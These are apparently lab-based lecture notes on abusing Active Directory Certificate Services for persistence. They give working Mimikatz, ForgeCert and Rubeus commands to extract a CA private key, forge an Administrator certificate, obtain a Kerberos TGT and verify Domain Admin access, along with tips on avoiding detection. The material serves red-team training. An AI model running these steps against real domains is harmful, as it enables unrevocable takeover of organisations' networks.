🔐 Certificate-Based Persistence (AD CS Abuse)
Why Credential-Based Persistence Is Not Enough

Most persistence techniques rely on credentials (passwords, hashes, tickets).

🔁 Problem:

Blue team can rotate passwords

Reset Golden/Silver tickets

Eventually kick attackers out

✅ Solution:

Use credential-agnostic persistence

This lecture focuses on Active Directory Certificate Services (AD CS) as a long-term, stealthy persistence mechanism.

🔄 The Return of AD CS

Certificates are not just for privilege escalation — they are perfect for persistence.

Why Certificates Are Powerful

Certificates can be used for Client Authentication

Allow attackers to request Kerberos TGTs

Unaffected by password rotations

Valid until:

Certificate expires

Certificate is revoked

📌 Default validity: ~5 years

🧠 Certificate Persistence vs Credential Persistence
Technique	Broken by Rotation?	Detectability	Longevity
Passwords	✅ Yes	Medium	Short
NTLM Hash	✅ Yes	Medium	Short
Golden Ticket	⚠️ Partial	High	Medium
Certificate	❌ No	Low	Long
CA Private Key	❌ No	Extremely Low	Permanent
🏛️ Attacking the Certificate Authority (CA)

Instead of abusing issued certificates, we target the CA itself.

Why This Is Devastating

If attackers:

Steal the CA private key

Generate certificates offline

Never register them with AD CS

Then:

Blue team cannot revoke them

Only fix = Revoke root CA

Result = Entire PKI collapse

This forces a full enterprise certificate rebuild

🔑 Where the CA Private Key Lives

Stored on the CA server

Usually protected by DPAPI

Rarely protected by HSM in real environments

Tools That Can Extract It

Mimikatz (simplest)

SharpDPAPI (alternative)

🧪 Extracting the CA Private Key (Mimikatz)
Step 1: Access the CA Server
ssh Administrator@THMDC.za.tryhackme.loc

Step 2: Prepare Workspace
mkdir <username>
cd <username>
C:\Tools\mimikatz_trunk\x64\mimikatz.exe

Step 3: Enumerate Certificates
crypto::certificates /systemstore:local_machine


🔍 Look for:

CA certificate

Issuer: CN=za-THMDC-CA

Exportable key: NO (expected)

Step 4: Patch Crypto Protections
privilege::debug
crypto::capi
crypto::cng


📌 Purpose:

Patch CryptoAPI & KeyIso

Force non-exportable keys to become exportable

Step 5: Export Certificates
crypto::certificates /systemstore:local_machine /export


📂 Output formats:

.pfx (includes private key)

.der (public certificate)

🎯 Target File:

za-THMDC-CA.pfx


📌 Default password: mimikatz

🚚 Transferring the CA Certificate

Copy za-THMDC-CA.pfx to:

AttackBox, or

THMWRK1, or

Non-domain Windows machine

🧾 Forging Certificates (ForgeCert)

With the CA private key, we can generate trusted certificates for any user.

Forge Client Authentication Certificate
ForgeCert.exe ^
--CaCertPath za-THMDC-CA.pfx ^
--CaCertPassword mimikatz ^
--Subject CN=User ^
--SubjectAltName Administrator@za.tryhackme.loc ^
--NewCertPath fullAdmin.pfx ^
--NewCertPassword Password123

Key Parameters

SubjectAltName → UPN of impersonated user

Must be a real domain account

Certificate never registered with AD CS

🎟️ Requesting a TGT Using Certificate (Rubeus)
Request Kerberos TGT
Rubeus.exe asktgt ^
/user:Administrator ^
/enctype:aes256 ^
/certificate:fullAdmin.pfx ^
/password:Password123 ^
/outfile:administrator.kirbi ^
/domain:za.tryhackme.loc ^
/dc:<DC IP>

Why AES256 Matters

Avoids Overpass-the-Hash detection

Default RC4 is noisy

🧠 Injecting the TGT (Mimikatz)
kerberos::ptt administrator.kirbi

✅ Verifying Domain Admin Access
dir \\THMDC.za.tryhackme.loc\c$\


📌 Success confirms:

Valid TGT

Full DA access

Certificate trust intact